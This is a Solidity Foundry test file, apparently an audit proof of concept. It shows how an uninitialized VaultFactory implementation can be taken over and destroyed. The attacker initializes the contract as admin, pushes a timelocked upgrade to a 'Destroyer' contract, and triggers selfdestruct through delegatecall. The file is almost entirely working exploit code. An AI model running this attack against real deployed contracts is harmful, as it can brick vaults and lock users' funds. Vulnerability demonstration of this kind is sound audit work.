// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.19;

import "../BaseTest.sol";

contract Destroyer {
    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    function test() external {
        console.log("Destroying VaultFactory...");
        selfdestruct(payable(address(0)));
    }

    function proxiableUUID() external pure returns (bytes32) {
        return _IMPLEMENTATION_SLOT;
    }
}

contract HO1PoCTest is BaseTest {
    function setUp() public override {
        super.setUp();
        // KYC both Alice and Bob.
        kycUsers();
        // Create our own malicious admin
        address admin = address(0x1);
        // Deploy our malicious Implementation
        Destroyer destroyer = new Destroyer();
        address newImplementation = address(destroyer);
        // Attach our instance to the already deployed VaultFactory
        VaultFactory vaultFactoryNew = VaultFactory(address(0x212224D2F2d262cd093eE13240ca4873fcCBbA3C));

        // Initialize the new VaultFactory
        vaultFactoryNew.initialize(
            admin, address(0), address(0), ISignerRegistry(address(0)), IAccessRegistry(address(0)), IKeys(address(0))
        );

        // Become the ADMIN
        vm.startPrank(admin);
        // Use the proposeUpgrade function to pass the malicious implementation
        vaultFactoryNew.proposeUpgrade(newImplementation);
        // Wait 5 days
        vm.warp(block.timestamp + 5 days);
        // Execute the upgrade process and pass the test function from the implementation to call it via delegatecall
        vaultFactoryNew.executeUpgrade(abi.encodeWithSignature("test()"));

        vm.stopPrank();
    }

    function test_VaultFactory_Implementation_Destruction() public view {
        // Print out the bytecode of the VaultFactory implementation
        console.logBytes(address(0x212224D2F2d262cd093eE13240ca4873fcCBbA3C).code);
        // Call the methods of the implementation via proxy
        vaultFactory.nameAndVersion();
    }
}
